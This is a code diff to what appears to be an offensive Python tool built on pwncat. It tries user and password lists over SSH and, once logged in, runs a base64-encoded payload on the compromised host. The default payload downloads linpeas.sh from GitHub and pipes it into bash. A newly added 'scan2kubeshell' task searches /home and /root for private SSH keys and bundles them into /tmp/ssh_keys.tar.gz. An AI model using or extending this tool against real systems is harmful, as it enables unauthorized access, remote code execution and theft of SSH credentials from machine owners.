@@ -23,8 +23,9 @@ parser.add_argument('--password-list', dest='password_list', type=str,
 parser.add_argument('--identity-list', dest='identity_list', type=str,
                     default=None, help='target identities file path (format: base64 encoded single line per identity)')
 parser.add_argument('--payload', dest='payload', type=str,
-                    default='curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex', help='target payload to deliver')
-
+                    default=base64.b64encode(b'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex'), help='target base64 payload to deliver')
+parser.add_argument('--task', dest='task', type=str,
+                    default="custom", help='target task name - use custom to execute payload')
 
 args = parser.parse_args()
 
@@ -36,6 +37,21 @@ def new_session(session: pwncat.manager.Session):
     return False
 
 
+def execute(session: pwncat.manager.Session, task):
+    if task == "custom":
+        result = session.platform.run(
+            f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector | base64 -d | /bin/bash'",
+            cwd="/tmp", timeout=900)
+        session.log(result)
+    elif task == "scan2kubeshell":
+        result = session.platform.run(
+            'rm -f /tmp/ssh_keys.tar /tmp/ssh_keys.tar.gz 2>/dev/null; for f in $(find  /home /root -name .ssh | xargs -I {} find {} -type f); do if grep "PRIVATE" $f >/dev/null; then tar -C $(dirname $f) -rvf /tmp/ssh_keys.tar $f 2>/dev/null; fi done; gzip /tmp/ssh_keys.tar')
+        result = session.platform.run(
+            f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector | base64 -d | /bin/bash'",
+            cwd="/tmp", timeout=900)
+        session.log(result)
+
+
 with pwncat.manager.Manager() as manager:
     # Establish a pwncat session
     manager.load_modules(os.path.join(os.getcwd(), "plugins"))
@@ -44,7 +60,7 @@ with pwncat.manager.Manager() as manager:
     users = []
     passwords = []
     identities = []
-    payload = base64.b64encode(args.payload.encode("utf-8"))
+    payload = args.payload
 
     if args.user_list is not None and Path.exists(args.user_list):
         with open(Path(args.user_list)) as f:
@@ -85,10 +101,6 @@ with pwncat.manager.Manager() as manager:
                     user=user,
                     password=password,
                 )
-                result = session.platform.run(
-                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector | base64 -d | /bin/bash'",
-                    cwd="/tmp", timeout=900)
-                print(result)
             except ChannelError as e:
                 if e.args[0] == 'ssh authentication failed: Authentication failed.':
                     print("Authentication failed: Bad password or user name.")
